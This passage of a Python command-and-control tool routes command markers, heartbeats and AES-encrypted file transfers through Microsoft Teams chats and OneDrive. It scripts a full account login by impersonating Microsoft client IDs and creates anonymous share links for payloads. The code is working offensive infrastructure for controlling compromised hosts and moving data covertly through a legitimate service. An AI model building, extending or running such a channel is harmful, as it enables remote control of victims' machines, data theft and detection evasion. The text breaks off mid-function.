#!/usr/bin/env python3


import argparse
import base64
import hashlib
import html
import json
import os
import re
import sys
import threading
import time
import uuid
import urllib.parse

import mimetypes
import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


try:
    import readline as _readline
    _HAS_READLINE = True
except ImportError:
    _HAS_READLINE = False  # Windows without pyreadline3 graceful degradation


_FILE_KEY_PASSPHRASE = "C2_FILE_TRANSFER_KEY_2026_CHANGE_ME"
FILE_KEY = hashlib.sha256(_FILE_KEY_PASSPHRASE.encode()).digest()  # 32 bytes = AES-256


def encrypt_file(data: bytes) -> bytes:
    """
    Encrypt bytes with AES-256-GCM.
    Output format: [12-byte nonce][ciphertext + 16-byte GCM tag]
    The nonce is randomly generated per file and prepended to the output.
    """
    nonce = os.urandom(12) 
    aesgcm = AESGCM(FILE_KEY)
    ciphertext = aesgcm.encrypt(nonce, data, None) 
    return nonce + ciphertext 


def decrypt_file(data: bytes) -> bytes:

    if len(data) < 12 + 16:
        raise ValueError(f"Encrypted blob too short ({len(data)} bytes)")
    nonce      = data[:12]
    ciphertext = data[12:]
    aesgcm     = AESGCM(FILE_KEY)
    return aesgcm.decrypt(nonce, ciphertext, None)


######################################################################################################################

CMD_START = "##CMD##"   # Server -> Client: command payload
CMD_END   = "##END##"
OUT_START = "##OUT##"   # Client -> Server: stdout payload
OUT_END   = "##END##"
ERR_START = "##ERR##"   # Client -> Server: stderr / error payload
ERR_END   = "##END##"
HB_START   = "##HB##"    # Client -> Server: heartbeat beacon
HB_END     = "##END##"
BLOB_START = "##BLOB##"  # Server -> Client: inline token blob (base64-encoded AES-GCM)
BLOB_END   = "##END##"
CHUNK_START        = "##CHUNK##"        # Server → Client: file chunk data
CHUNK_END          = "##END##"
CHUNK_START_MARKER = "##CHUNK_START##"  # Server → Client: begin transfer (<name>|<total>)
CHUNK_DONE         = "##CHUNK_DONE##"   # Server → Client: all chunks sent (<name>)

UPLOAD_CHUNK_BYTES = 15 * 1024   # 15 KB raw per chunk

SERVER_POLL_INTERVAL = 4      # base interval
SERVER_POLL_TIMEOUT  = 120    # give up after this many seconds with no reply

HB_SILENT_AFTER = 180   # 3 minutes without a beacon → SILENT
HB_DEAD_AFTER   = 600   # 10 minutes without a beacon → DEAD

HB_MONITOR_INTERVAL = 30

######################################################################################################################

TEAMS_CLIENT_ID = "4b3e8f46-56d3-427f-b1e2-d239b2ea6bca"
M365_CLIENT_ID  = "4765445b-32c6-49b0-83e6-1d93765276ca"
TEAMS_TENANT    = "9188040d-6c67-4c5b-b112-36a304b66dad"

NONCE = (
    "639207421960506366."
    "ZWQ2ZDg4ODUtMDU3Ny00NGVkLThjMmMtNmM5M2JjOWUyNTM2"
    "OTZlYmVjMTQtMDM3Yi00NzY1LWE0Y2EtYjVkNjA3MTRmOTU1"
)

COMMON_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/150.0.0.0 Safari/537.36"
    ),
    "Accept-Language": "en-US,en;q=0.9",
}

MAX_RETRIES          = 3
DEFAULT_RETRY_AFTER  = 5


######################################################################################################################

def _re(pattern, text, group=1, flags=0, default=""):
    m = re.search(pattern, text, flags)
    return m.group(group) if m else default

def _dbg(msg, debug=False):
    if debug:
        print(f"  [DBG] {msg}", file=sys.stderr)

def _generate_pkce():
    verifier  = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b"=").decode()
    challenge = base64.urlsafe_b64encode(
        hashlib.sha256(verifier.encode()).digest()
    ).rstrip(b"=").decode()
    return verifier, challenge

def _submit_form(session, html, base_url, debug=False):
    form_m = re.search(r'<form[^>]+action="([^"]+)"', html)
    if not form_m:
        return None
    action = form_m.group(1)
    if action == "#" or not action:
        return None
    if action.startswith("/"):
        parsed = urllib.parse.urlparse(base_url)
        action = f"{parsed.scheme}://{parsed.netloc}{action}"
    hidden = {k: v for k, v in re.findall(
        r'<input[^>]+type="hidden"[^>]+name="([^"]+)"[^>]+value="([^"]*)"', html
    )}
    return session.post(
        action, data=hidden,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": urllib.parse.urlparse(action).scheme + "://" + urllib.parse.urlparse(action).netloc,
            "Referer": base_url,
        },
        allow_redirects=False,
    )


######################################################################################################################

def refresh_all_tokens(tokens: dict, debug: bool = False) -> None:
    session       = tokens["session"]
    refresh_token = tokens["refresh_token"]
    cid           = str(uuid.uuid4())

    print("[!] Refreshing tokens...")

    r8 = session.post(
        f"https://login.microsoftonline.com/{TEAMS_TENANT}/oauth2/v2.0/token",
        data={
            "client_id":     TEAMS_CLIENT_ID,
            "scope":         "https://auth.fl.teams.microsoft.com/teams.auth.readwrite openid profile offline_access",
            "grant_type":    "refresh_token",
            "client_info":   "1",
            "x-client-SKU":  "msal.js.browser",
            "x-client-VER":  "5.6.3",
            "refresh_token": refresh_token,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://teams.live.com"},
    )
    d8 = r8.json()
    if r8.status_code != 200 or "error" in d8:
        err = d8.get("error", "")
        if "invalid_grant" in err or "AADSTS70008" in d8.get("error_description", ""):
            raise RuntimeError("Refresh token expired. Re-run with your credentials.")
        raise RuntimeError(f"Token refresh Step 8 failed: {d8.get('error')} – {d8.get('error_description','')}")
    if d8.get("refresh_token"):
        tokens["refresh_token"] = d8["refresh_token"]
    tokens["access_token"] = d8["access_token"]

    r8b = session.post(
        "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
        data={
            "client_id":     TEAMS_CLIENT_ID,
            "scope":         "https://graph.microsoft.com/Files.ReadWrite openid profile offline_access",
            "grant_type":    "refresh_token",
            "client_info":   "1",
            "x-client-SKU":  "msal.js.browser",
            "x-client-VER":  "5.6.3",
            "refresh_token": tokens["refresh_token"],
        },
        headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://teams.live.com"},
    )
    if r8b.status_code == 200:
        tokens["graph_token"] = r8b.json().get("access_token", tokens.get("graph_token", ""))

    r9 = session.post(
        "https://teams.live.com/api/auth/v2.0/authz/consumer",
        headers={
            "Authorization":       f"Bearer {tokens['access_token']}",
            "Content-Type":        "application/json",
            "Accept":              "application/json",
            "Origin":              "https://teams.live.com",
            "X-Ms-Client-Type":    "web",
            "X-Ms-Client-Version": "1415/26070217343",
            "Ms-Teams-Authz-Type": "ExplicitLogin",
            "Clientrequestid":     f"Core-{cid}",
        },
        json={},
    )
    if r9.status_code != 200:
        raise RuntimeError(f"Token refresh Step 9 (skypeToken) failed: {r9.status_code}")
    d9   = r9.json()
    sobj = d9.get("skypeToken", {})
    tokens["skype_token"] = sobj.get("skypetoken", "") if isinstance(sobj, dict) else str(sobj)
    _dbg("Tokens refreshed successfully.", debug)
    print("[+] Tokens refreshed.")


######################################################################################################################

def _api_call(session, method, url, tokens, debug=False, **kwargs):

    for attempt in range(1, MAX_RETRIES + 1):
        resp = session.request(method, url, **kwargs)
        _dbg(f"[{method}] {url[:70]} → {resp.status_code} (attempt {attempt})", debug)

        if resp.status_code == 429:
            # Rate limited
            try:
                wait = int(resp.headers.get("Retry-After", DEFAULT_RETRY_AFTER))
            except (ValueError, TypeError):
                wait = DEFAULT_RETRY_AFTER
            print(f"[!] 429 Too Many Requests — waiting {wait}s (Retry-After: {resp.headers.get('Retry-After','not set')})...")
            time.sleep(wait)
            continue

        if resp.status_code == 401:
            if attempt == MAX_RETRIES:
                break
            refresh_all_tokens(tokens, debug=debug)
            hdrs = kwargs.get("headers", {})
            if "Authentication" in hdrs:
                hdrs["Authentication"] = f"skypetoken={tokens['skype_token']}"
            if "Authorization" in hdrs:
                if "graph.microsoft.com" in url:
                    hdrs["Authorization"] = f"Bearer {tokens['graph_token']}"
                else:
                    hdrs["Authorization"] = f"Bearer {tokens['access_token']}"
            kwargs["headers"] = hdrs
            continue

        return resp

    return resp


######################################################################################################################

def login(username: str, password: str, debug: bool = False) -> dict:

    session = requests.Session()
    session.headers.update(COMMON_HEADERS)
    cid = str(uuid.uuid4())
    code_verifier, code_challenge = _generate_pkce()

    # Step 1
    print("[*] Step 1: GET AAD authorize")
    r1 = session.get(
        "https://login.microsoftonline.com/common/oauth2/v2.0/authorize",
        params={
            "client_id": M365_CLIENT_ID, "redirect_uri": "https://m365.cloud.microsoft/landingv2",
            "response_type": "code id_token", "scope": "openid profile https://www.office.com/v2/OfficeHome.All",
            "response_mode": "form_post", "nonce": NONCE, "ui_locales": "en-US", "mkt": "en-US",
            "client-request-id": cid, "state": "srv_state", "x-client-SKU": "ID_NET8_0",
            "x-client-ver": "8.16.0.0", "sso_reload": "true",
        },
    )
    r1.raise_for_status()
    sft    = _re(r'"sFT"\s*:\s*"([^"]+)"', r1.text)
    canary = _re(r'"apiCanary"\s*:\s*"([^"]+)"', r1.text)
    sctx   = _re(r'"sCtx"\s*:\s*"([^"]+)"', r1.text)
    sess_id = _re(r'"sessionId"\s*:\s*"([^"]+)"', r1.text, default=cid)
    if not sft:
        raise RuntimeError("Step 1 failed: could not extract sFT.")

    # Step 2
    print("[*] Step 2: POST GetCredentialType")
    r2 = session.post(
        "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US",
        json={
            "username": username, "isOtherIdpSupported": True, "checkPhones": False,
            "isRemoteNGCSupported": True, "isCookieBannerShown": False, "isFidoSupported": True,
            "originalRequest": sctx, "country": "IL", "forceotclogin": False,
            "isExternalFederationDisallowed": False, "isRemoteConnectSupported": False,
            "federationFlags": 0, "isSignup": False, "flowToken": sft,
            "isAccessPassSupported": True, "isQrCodePinSupported": True,
        },
        headers={
            "Content-Type": "application/json; charset=UTF-8", "Accept": "application/json",
            "Hpgid": "1104", "Hpgact": "1800", "Canary": canary,
            "Client-Request-Id": cid, "Hpgrequestid": sess_id,
            "Origin": "https://login.microsoftonline.com", "Referer": "https://login.microsoftonline.com/",
        },
    )
    r2.raise_for_status()
    gct = r2.json()
    sft = gct.get("FlowToken", sft)
    if gct.get("IfExistsResult") not in (0, 1, 5, 6):
        raise RuntimeError(f"Step 2: account not found (IfExistsResult={gct.get('IfExistsResult')}).")

    # Step 3
    print("[*] Step 3: GET login.live.com")
    r3 = session.get(
        "https://login.live.com/oauth20_authorize.srf",
        params={
            "client_id": M365_CLIENT_ID, "scope": "openid profile https://www.office.com/v2/OfficeHome.All",
            "redirect_uri": "https://m365.cloud.microsoft/landingv2", "response_type": "code id_token",
            "response_mode": "form_post", "nonce": NONCE, "ui_locales": "en-US", "mkt": "en-US",
            "client-request-id": cid, "state": "srv_state", "login_hint": username,
            "uaid": cid.replace("-", ""), "msproxy": "1", "issuer": "mso", "tenant": "common", "jshs": "0",
        },
        headers={"Referer": "https://login.microsoftonline.com/"},
    )
    r3.raise_for_status()
    html3 = r3.text
    ppft = ""
    sftag_m = re.search(r'"sFTTag"\s*:\s*("(?:[^"\\]|\\.)*")', html3)
    if sftag_m:
        try:
            sftag_html = json.loads(sftag_m.group(1))
            ppft_m = re.search(r'value="([^"]+)"', sftag_html)
            if ppft_m:
                ppft = ppft_m.group(1)
        except Exception:
            pass
    if not ppft:
        ppft = _re(r'<input[^>]+name="PPFT"[^>]+value="([^"]+)"', html3)
    if not ppft:
        raise RuntimeError("Step 3 failed: could not extract PPFT.")
    urlpost_raw = _re(r'"urlPost"\s*:\s*"([^"]+)"', html3)
    ppsx_url = urlpost_raw.replace("\\/", "/") if urlpost_raw else "https://login.live.com/ppsecure/post.srf"

    # Step 4
    print("[*] Step 4: POST checkpassword.srf")
    r4 = session.post(
        "https://login.live.com/checkpassword.srf",
        json={"username": username, "password": password, "checkpasswordflowtoken": ""},
        headers={
            "Content-Type": "application/json; charset=utf-8", "Accept": "application/json",
            "Hpgid": "33", "Hpgact": "0", "Correlationid": cid, "Client-Request-Id": cid,
            "Origin": "https://login.live.com", "Referer": r3.url,
        },
    )
    r4.raise_for_status()
    d4 = r4.json()
    vft = d4.get("vanguardflowtoken", "")
    if d4.get("validationresult") != "succeed":
        raise RuntimeError(f"Step 4: password check failed ({d4.get('validationresult')}).")

    # Step 5
    print("[*] Step 5: POST ppsecure/post.srf")
    r5 = session.post(
        ppsx_url,
        data={
            "login": username, "loginfmt": username, "type": "11", "LoginOptions": "3",
            "passwd": password, "ps": "2", "PPFT": ppft, "PPSX": "Passpor", "flowToken": vft,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://login.live.com", "Referer": r3.url},
        allow_redirects=False,
    )
    err_code = _re(r'"sErrorCode"\s*:\s*"([^"]+)"', r5.text)
    if err_code:
        raise RuntimeError(f"Step 5 error: {err_code}")
    current_resp, current_url = r5, ppsx_url
    for _ in range(8):
        status = current_resp.status_code
        html_r = current_resp.text
        if status in (301, 302, 303, 307, 308):
            loc = current_resp.headers.get("Location", "")
            if not loc:
                break
            current_url = loc
            current_resp = session.get(loc, allow_redirects=False)
            continue
        form_m = re.search(r'<form[^>]+action="([^"]+)"', html_r)
        if form_m and form_m.group(1) not in ("#", ""):
            sub = _submit_form(session, html_r, current_url, debug)
            if sub is not None:
                current_url = form_m.group(1)
                current_resp = sub
                continue
        cookies = session.cookies.get_dict()
        if "__Host-MSAAUTH" in cookies or "WLSSC" in cookies:
            break
        break
    cookies = session.cookies.get_dict()
    if "__Host-MSAAUTH" not in cookies and "WLSSC" not in cookies:
        raise RuntimeError("Step 5: MSA auth cookies not received.")

    # Step 6
    print("[*] Step 6: GET Teams authorize → code")
    teams_nonce = str(uuid.uuid4())
    params6 = {
        "client_id": TEAMS_CLIENT_ID,
        "scope": "https://mtsvc.fl.teams.microsoft.com/teams.mt.readwrite openid profile offline_access",
        "redirect_uri": "https://teams.live.com/v2/authv2",
        "client-request-id": f"Core-{cid}", "response_mode": "fragment",
        "client_info": "1", "clidata": "1", "prompt": "none", "nonce": teams_nonce,
        "state": "eyJpZCI6IjAxOWZhMmY1In0", "x-client-SKU": "msal.js.browser",
        "x-client-VER": "5.6.3", "response_type": "code",
        "code_challenge": code_challenge, "code_challenge_method": "S256",
    }
    current_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?" + urllib.parse.urlencode(params6)
    code = None
    for hop in range(20):
        r6 = session.get(current_url, allow_redirects=False)
        loc = r6.headers.get("Location", "")
        _dbg(f"Hop {hop}: {r6.status_code} → {loc[:100]}", debug)
        if r6.status_code == 200:
            code_f = _re(r'name="code"[^>]+value="([^"]+)"', r6.text)
            if code_f:
                code = code_f
            break
        if not loc:
            break
        code_m = re.search(r"[#&?]code=([^&\s#]+)", loc)
        if code_m:
            code = urllib.parse.unquote(code_m.group(1))
            break
        err_m = re.search(r"[#&]error=([^&\s]+)", loc)
        if err_m:
            raise RuntimeError(f"Step 6 error: {urllib.parse.unquote(err_m.group(1))}")
        current_url = loc
    if not code:
        raise RuntimeError("Step 6: failed to obtain authorization code.")

    # Step 7
    print("[*] Step 7: POST token (code → refresh_token)")
    r7 = session.post(
        "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
        data={
            "client_id": TEAMS_CLIENT_ID, "code": code,
            "redirect_uri": "https://teams.live.com/v2/authv2",
            "grant_type": "authorization_code", "code_verifier": code_verifier,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://teams.live.com"},
    )
    r7.raise_for_status()
    d7 = r7.json()
    if "error" in d7:
        raise RuntimeError(f"Step 7: {d7.get('error')} – {d7.get('error_description','')}")
    refresh_token = d7.get("refresh_token", "")
    if not refresh_token:
        raise RuntimeError("Step 7: no refresh_token.")

    # Step 8a
    print("[*] Step 8a: POST token (refresh_token → access_token)")
    r8 = session.post(
        f"https://login.microsoftonline.com/{TEAMS_TENANT}/oauth2/v2.0/token",
        data={
            "client_id": TEAMS_CLIENT_ID,
            "scope": "https://auth.fl.teams.microsoft.com/teams.auth.readwrite openid profile offline_access",
            "grant_type": "refresh_token", "client_info": "1",
            "x-client-SKU": "msal.js.browser", "x-client-VER": "5.6.3",
            "refresh_token": refresh_token,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://teams.live.com"},
    )
    r8.raise_for_status()
    d8 = r8.json()
    if "error" in d8:
        raise RuntimeError(f"Step 8: {d8.get('error')}")
    access_token = d8.get("access_token", "")

    # Step 8b
    print("[*] Step 8b: POST token (refresh_token → graph_token)")
    r8b = session.post(
        "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
        data={
            "client_id": TEAMS_CLIENT_ID,
            "scope": "https://graph.microsoft.com/Files.ReadWrite openid profile offline_access",
            "grant_type": "refresh_token", "client_info": "1",
            "x-client-SKU": "msal.js.browser", "x-client-VER": "5.6.3",
            "refresh_token": refresh_token,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://teams.live.com"},
    )
    graph_token = r8b.json().get("access_token", "") if r8b.status_code == 200 else ""

    # Step 9
    print("[*] Step 9: POST authz/consumer → skypeToken")
    r9 = session.post(
        "https://teams.live.com/api/auth/v2.0/authz/consumer",
        headers={
            "Authorization": f"Bearer {access_token}", "Content-Type": "application/json",
            "Accept": "application/json", "Origin": "https://teams.live.com",
            "X-Ms-Client-Type": "web", "X-Ms-Client-Version": "1415/26070217343",
            "Ms-Teams-Authz-Type": "ExplicitLogin", "Clientrequestid": f"Core-{cid}",
        },
        json={},
    )
    r9.raise_for_status()
    d9   = r9.json()
    sobj = d9.get("skypeToken", {})
    skype_token  = sobj.get("skypetoken", "") if isinstance(sobj, dict) else str(sobj)
    skype_id     = sobj.get("skypeid", "")   if isinstance(sobj, dict) else ""
    display_name = sobj.get("signinname", username) if isinstance(sobj, dict) else username
    if not skype_token:
        raise RuntimeError("Step 9: no skypeToken.")

    # Extract OID from id_token for X-AnchorMailbox in refresh
    oid = ""
    id_token = d7.get("id_token", "")
    if id_token:
        try:
            payload_b64 = id_token.split(".")[1]
            payload_b64 += "=" * (4 - len(payload_b64) % 4)
            oid = json.loads(base64.urlsafe_b64decode(payload_b64)).get("oid", "")
        except Exception:
            pass

    print("[+] Login successful!")
    print(f"    skype_id : {skype_id}")
    print(f"    name     : {display_name}")

    return {
        "refresh_token": refresh_token,
        "access_token":  access_token,
        "graph_token":   graph_token,
        "skype_token":   skype_token,
        "skype_id":      skype_id,
        "display_name":  display_name,
        "oid":           oid,
        "session":       session,
    }


######################################################################################################################

def _skype_headers(skype_token: str) -> dict:
    return {
        "Authentication":            f"skypetoken={skype_token}",
        "Content-Type":              "application/json",
        "Accept":                    "*/*",
        "Origin":                    "https://teams.live.com",
        "Referer":                   "https://teams.live.com/v2/",
        "Clientinfo":                "os=windows; osVer=NT 10.0; proc=x86; lcid=en-us; deviceType=1; country=us; clientName=skypeteams; clientVer=1415/26070217343",
        "Behavioroverride":          "redirectAs404",
        "Ms-Ic3-Product":            "tfl",
        "Ms-Ic3-Additional-Product": "Sfl",
    }


def resolve_thread(contact: str, tokens: dict, debug: bool = False) -> str:
    session     = tokens["session"]
    skype_token = tokens["skype_token"]
    skype_id    = tokens["skype_id"]

    if contact.startswith("19:") or contact.startswith("48:") or \
       (contact.startswith("8:") and "@" not in contact):
        return contact

    hdrs = _skype_headers(skype_token)
    csa_hdrs = {
        "X-Skypetoken":              skype_token,
        "X-Ms-User-Type":            "real-user",
        "X-Ms-Client-Type":          "web",
        "X-Ms-Client-Version":       "1415/26070217343",
        "Ms-Ic3-Product":            "tfl",
        "Ms-Ic3-Additional-Product": "Sfl",
        "Accept":                    "*/*",
        "Origin":                    "https://teams.live.com",
        "Referer":                   "https://teams.live.com/v2/",
        "Cache-Control":             "no-store, no-cache",
    }
    email_local = contact.split("@")[0].lower() if "@" in contact else contact.lower()
    target_mri  = None

    print(f"[*] Looking up conversation with {contact}...")

    try:
        r = _api_call(session, "GET", "https://teams.live.com/api/csa/api/v3/teams/users/me",
                      tokens, debug=debug,
                      params={"isPrefetch": "false", "enableMembershipSummary": "true",
                              "supportsAdditionalSystemGeneratedFolders": "true",
                              "enableEngageCommunities": "false"},
                      headers=csa_hdrs, timeout=20)
        _dbg(f"CSA status: {r.status_code}", debug)
        if r.status_code == 200:
            for chat in r.json().get("chats", []):
                for m in chat.get("members", []):
                    mri = m.get("mri", "")
                    if mri.lower() == skype_id.lower():
                        continue
                    if email_local in mri.lower() or email_local in (contact.lower()):
                        if ".cid." in mri or email_local in mri.lower():
                            target_mri = mri
                            print(f"[*] Found existing conversation (CSA): {chat['id']}")
                            return chat["id"]
    except Exception as e:
        _dbg(f"CSA lookup failed: {e}", debug)

    try:
        r = _api_call(session, "GET",
                      "https://teams.live.com/api/chatsvc/consumer/v1/users/ME/conversations",
                      tokens, debug=debug,
                      params={"startTime": "0", "view": "msnp24Equivalent", "pageSize": "200"},
                      headers=hdrs, timeout=15)
        _dbg(f"chatsvc conversations status: {r.status_code}", debug)
        if r.status_code == 200:
            for conv in r.json().get("conversations", []):
                for m in conv.get("members", []):
                    mri     = m.get("id", "")
                    display = (m.get("displayName") or m.get("friendlyName") or "").lower()
                    if mri.lower() != skype_id.lower() and (
                        email_local in mri.lower()
                        or email_local in display
                        or ("@" in contact and contact.lower() in display)
                    ):
                        target_mri = mri
                        print(f"[*] Found existing conversation (chatsvc): {conv['id']}")
                        return conv["id"]
    except Exception as e:
        _dbg(f"chatsvc lookup failed: {e}", debug)

    print(f"[*] Searching for user {contact}...")
    try:
        r_search = _api_call(session, "GET",
                             "https://teams.live.com/api/mt/part/consumer-s/beta/users",
                             tokens, debug=debug,
                             params={"q": contact, "top": "10"},
                             headers=hdrs, timeout=10)
        _dbg(f"User search: {r_search.status_code} {r_search.text[:200]}", debug)
        if r_search.status_code == 200:
            results = r_search.json()
            if isinstance(results, dict):
                results = results.get("value", results.get("users", []))
            for u in results:
                mri   = u.get("mri") or u.get("id") or ""
                email = (u.get("email") or u.get("userPrincipalName") or "").lower()
                uname = (u.get("displayName") or u.get("username") or "").lower()
                if mri and (
                    email == contact.lower()
                    or email_local in email
                    or email_local in uname
                    or email_local in mri.lower()
                ):
                    target_mri = mri
                    _dbg(f"Resolved MRI via search: {target_mri}", debug)
                    print(f"[*] Resolved user MRI: {target_mri}")
                    break
    except Exception as e:
        _dbg(f"User search failed: {e}", debug)

    # Fallback MRI construction if search failed
    if not target_mri:
        target_mri = f"8:live:{email_local}"
        _dbg(f"Using constructed MRI (may fail): {target_mri}", debug)
        print(f"[!] Could not resolve real MRI; using: {target_mri}")

    print(f"[*] Creating new conversation with {target_mri}...")
    try:
        r_create = _api_call(session, "POST",
                             "https://teams.live.com/api/chatsvc/consumer/v1/threads",
                             tokens, debug=debug,
                             json={
                                 "members": [
                                     {"id": skype_id,   "role": "Admin"},
                                     {"id": target_mri, "role": "User"},
                                 ],
                                 "properties": {
                                     "threadType":       "chat",
                                     "chatFilesIndexId": "",
                                 },
                             },
                             headers=hdrs, timeout=15)
        _dbg(f"POST /threads: {r_create.status_code} {r_create.text[:300]}", debug)
        loc      = r_create.headers.get("Location", "")
        thread_m = re.search(r"(19:[^/\s]+)", loc)
        if r_create.status_code in (200, 201) and thread_m:
            thread_id = thread_m.group(1)
            print(f"[*] Created conversation: {thread_id}")
            return thread_id
        if r_create.status_code in (200, 201):
            thread_id = r_create.json().get("id", "")
            if thread_id:
                print(f"[*] Created conversation: {thread_id}")
                return thread_id
        if r_create.status_code == 409:
            thread_m2 = re.search(r"(19:[^/\s]+)", loc)
            if thread_m2:
                thread_id = thread_m2.group(1)
                print(f"[*] Existing conversation (409): {thread_id}")
                return thread_id
    except Exception as e:
        _dbg(f"Create thread failed: {e}", debug)

    _dbg(f"Falling back to direct MRI: {target_mri}", debug)
    print(f"[!] Could not resolve thread ID; using direct MRI: {target_mri}")
    return target_mri


_UPLOAD_SESSION_THRESHOLD = 4 * 1024 * 1024   # 4 MB
_UPLOAD_CHUNK_SIZE        = 4 * 1024 * 1024   # 4 MB per PUT chunk



######################################################################################################################

def upload_to_onedrive(local_path: str, remote_name: str, tokens: dict,
                       debug: bool = False) -> dict:

    session     = tokens["session"]
    graph_token = tokens.get("graph_token", "")
    if not graph_token:
        raise RuntimeError("No graph_token available. Cannot upload to OneDrive.")

    local_path = os.path.abspath(local_path)
    if not os.path.isfile(local_path):
        raise RuntimeError(f"File not found: {local_path}")

    file_name = remote_name or os.path.basename(local_path)
    file_ext  = os.path.splitext(file_name)[1].lstrip(".").upper() or "BIN"
    mime_type = mimetypes.guess_type(file_name)[0] or "application/octet-stream"
    ext_lower = file_ext.lower()

    with open(local_path, "rb") as fh:
        file_data = fh.read()

    plain_size = len(file_data)
    file_data  = encrypt_file(file_data) 
    file_size  = len(file_data)

    encoded_name = urllib.parse.quote(file_name)

    common_headers = {
        "Authorization": f"Bearer {graph_token}",
        "Osname":        "Windows",
        "Scenariotype":  "AUO",
        "Scenario":      "UploadFile_TeamsMSAFile",
        "Fileextension": file_ext,
        "Accept":        "*/*",
        "Origin":        "https://teams.live.com",
        "Referer":       "https://teams.live.com/",
    }

    print(f"[*] Uploading '{file_name}' ({plain_size:,} bytes → {file_size:,} encrypted) to OneDrive...")

    if file_size <= _UPLOAD_SESSION_THRESHOLD:
        put_url = (
            f"https://graph.microsoft.com/v1.0/me/drive/root:"
            f"/Microsoft%20Teams%20Chat%20Files/{encoded_name}:"
            f"/content?@microsoft.graph.conflictBehavior=rename&select=*,sharepointIds"
        )
        hdrs = {**common_headers, "Content-Type": mime_type}
        r = _api_call(session, "PUT", put_url, tokens, debug=debug,
                      data=file_data, headers=hdrs, timeout=120)
        if r.status_code not in (200, 201):
            raise RuntimeError(f"OneDrive PUT failed ({r.status_code}): {r.text[:400]}")
        meta = r.json()

    else:
        session_url = (
            f"https://graph.microsoft.com/v1.0/me/drive/root:"
            f"/Microsoft%20Teams%20Chat%20Files/{encoded_name}:"
            f"/createUploadSession"
        )
        hdrs_sess = {
            **common_headers,
            "Content-Type": "application/json",
        }
        r_sess = _api_call(
            session, "POST", session_url, tokens, debug=debug,
            json={"item": {
                "@microsoft.graph.conflictBehavior": "rename",
                "name": file_name,
            }},
            headers=hdrs_sess,
            timeout=30,
        )
        if r_sess.status_code != 200:
            raise RuntimeError(f"createUploadSession failed ({r_sess.status_code}): {r_sess.text[:400]}")

        upload_url = r_sess.json().get("uploadUrl", "")
        if not upload_url:
            raise RuntimeError("createUploadSession returned no uploadUrl")
        _dbg(f"uploadUrl: {upload_url[:80]}...", debug)

        # Step 2
        offset = 0
        meta   = None
        while offset < file_size:
            end   = min(offset + _UPLOAD_CHUNK_SIZE - 1, file_size - 1)
            chunk = file_data[offset: end + 1]
            hdrs_chunk = {
                "Content-Length": str(len(chunk)),
                "Content-Range":  f"bytes {offset}-{end}/{file_size}",
                "Osname":         "Windows",
                "Scenariotype":   "AUO",
                "Scenario":       "UploadFile_TeamsMSAFile",
                "Fileextension":  file_ext,
                "Accept":         "*/*",
                "Origin":         "https://teams.live.com",
                "Referer":        "https://teams.live.com/",
                "User-Agent":     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            }
            r_chunk = session.put(
                f"{upload_url}&select=*,sharepointIds" if offset + len(chunk) == file_size else upload_url,
                data=chunk,
                headers=hdrs_chunk,
                timeout=300,
            )
            pct = int((end + 1) / file_size * 100)
            print(f"  [{pct}%] {end+1:,}/{file_size:,} bytes — HTTP {r_chunk.status_code}")

            if r_chunk.status_code in (200, 201):
                meta = r_chunk.json()
                break
            elif r_chunk.status_code == 202:

                offset = end + 1
                continue
            else:
                raise RuntimeError(f"Chunk PUT failed ({r_chunk.status_code}): {r_chunk.text[:400]}")

        if meta is None:
            raise RuntimeError("Upload completed but no final metadata received")

    item_id_raw   = meta.get("id", "")
    sp_ids        = meta.get("sharepointIds", {})
    list_item_uid = sp_ids.get("listItemUniqueId", "")
    site_url      = sp_ids.get("siteUrl", "")
    drive_id      = meta.get("parentReference", {}).get("driveId", "")
    web_url       = meta.get("webUrl", "")
    ext_lower     = file_ext.lower()

    file_url = (
        f"{site_url}/Documents/Microsoft Teams Chat Files/{file_name}"
        if site_url else web_url
    )

    onedrive_share_url = ""
    share_id = ""
    try:
        r_link = _api_call(
            session, "POST",
            f"https://graph.microsoft.com/v1.0/me/drive/items/{item_id_raw}/createLink",
            tokens, debug=debug,
            json={"type": "view", "scope": "anonymous"},
            headers={
                "Authorization": f"Bearer {graph_token}",
                "Content-Type":  "application/json",
                "Accept":        "application/json",
            },
            timeout=15,
        )
        if r_link.status_code in (200, 201):
            onedrive_share_url = r_link.json().get("link", {}).get("webUrl", "")
            if onedrive_share_url:
                share_url_b64 = base64.urlsafe_b64encode(
                    onedrive_share_url.encode()
                ).rstrip(b"=").decode()
                share_id = f"u!{share_url_b64}"
    except Exception as e:
        _dbg(f"createLink failed: {e}", debug)

    if not onedrive_share_url:
        ext_map = {"txt": "t", "pdf": "b", "docx": "w", "xlsx": "x", "pptx": "p"}
        drv_char   = ext_map.get(ext_lower, "u")
        item_short = item_id_raw.split("!")[1] if "!" in item_id_raw else item_id_raw
        onedrive_share_url = f"https://1drv.ms/{drv_char}/c/{drive_id.lower()}/{item_short}"
        share_url_b64 = base64.urlsafe_b64encode(
            onedrive_share_url.encode()
        ).rstrip(b"=").decode()
        share_id = f"u!{share_url_b64}"

    print(f"[+] Uploaded: {file_name} | shareId: {share_id[:40]}...")

    return {
        "itemid":   list_item_uid,
        "fileName": file_name,
        "fileType": ext_lower,
        "fileInfo": {
            "itemId":            item_id_raw,
            "fileUrl":           file_url,
            "siteUrl":           site_url,
            "serverRelativeUrl": "",
            "shareUrl":          onedrive_share_url,
            "shareId":           share_id,
        },
        "fileChicletState": {"serviceName": "p2p", "state": "active"},
        "@type":             "http://schema.skype.com/File",
        "version":           2,
        "id":                list_item_uid,
        "baseUrl":           site_url,
        "objectUrl":         file_url,
